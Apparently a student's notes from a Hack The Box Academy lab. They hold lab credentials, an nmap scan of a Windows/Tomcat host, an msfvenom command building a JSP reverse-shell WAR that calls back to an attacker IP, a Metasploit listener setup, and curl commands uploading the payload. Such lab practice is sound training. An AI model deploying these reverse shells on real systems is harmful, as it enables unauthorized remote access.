```
10.129.204.126
```

Credentials: htb-student / HTB_@cademy_stdnt!

Host 1: 172.16.1.11:8080
Host 3: 172.16.1.13
Host 2: blog.inlanefreight.local


```
xfreerdp /v:10.129.204.126 /u:htb-student /p:HTB_@cademy_stdnt!
```

#### NMAP Scan: Host 1
```
└──╼ $nmap -A -sC -Pn 10.129.32.8
Starting Nmap 7.92 ( https://nmap.org ) at 2023-10-14 12:19 EDT
Nmap scan report for status.inlanefreight.local (172.16.1.11)
Host is up (0.057s latency).
Not shown: 989 closed tcp ports (conn-refused)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Inlanefreight Server Status
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Windows Server 2019 Standard 17763 microsoft-ds
515/tcp  open  printer
1801/tcp open  msmq?
2103/tcp open  msrpc         Microsoft Windows RPC
2105/tcp open  msrpc         Microsoft Windows RPC
2107/tcp open  msrpc         Microsoft Windows RPC
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2023-10-14T16:20:08+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=shells-winsvr
| Not valid before: 2023-10-13T16:06:28
|_Not valid after:  2024-04-13T16:06:28
| rdp-ntlm-info: 
|   Target_Name: SHELLS-WINSVR
|   NetBIOS_Domain_Name: SHELLS-WINSVR
|   NetBIOS_Computer_Name: SHELLS-WINSVR
|   DNS_Domain_Name: shells-winsvr
|   DNS_Computer_Name: shells-winsvr
|   Product_Version: 10.0.17763
|_  System_Time: 2023-10-14T16:20:03+00:00
8080/tcp open  http          Apache Tomcat 10.0.11
|_http-open-proxy: Proxy might be redirecting requests
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/10.0.11
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-10-14T16:20:03
|_  start_date: N/A
| smb-os-discovery: 
|   OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)
|   Computer name: shells-winsvr
|   NetBIOS computer name: SHELLS-WINSVR\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2023-10-14T09:20:03-07:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: SHELLS-WINSVR, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:d5:ed (VMware)
|_clock-skew: mean: 1h23m59s, deviation: 3h07m50s, median: 0s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 60.75 seconds

```

#### Host 1 IPs and Domain Names

172.16.1.11  status.inlanefreight.local
172.16.1.12  blog.inlanefreight.local
10.129.201.134  lab.inlanefreight.local

#### Start firefox
```
/usr/bin/firefox
```
#### War Reverse Shell
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.16.1.5 LPORT=4444 -f war > reverse.war
```

#### Use Metasploit to Setup the Listener
```
msf5> use exploit/multi/handler  
msf5> set payload windows/meterpreter/reverse_tcp  
msf5> set LHOST 172.16.1.5 
msf5> set LPORT 4444  
msf5> run
```
#### Credentials

For Apache Tomcat
```
tomcat:Tomcatadm
```

For blog.inlanefreight.local
```
admin:admin123!@#
```

#### Curl Post Request
```
curl --upload-file reverse.war -u 'tomcat:Tomcatadm' "http://status.inlanefreight.local"
```

#### Upload the reverse.war file
```
curl -d @reverse2.war http://status.inlanefreight.local/form1
```


#### Tomcat login

**Login Page**
```
http://172.16.1.11:8080
```

**Credentials**
```
tomcat:Tomcatadm
```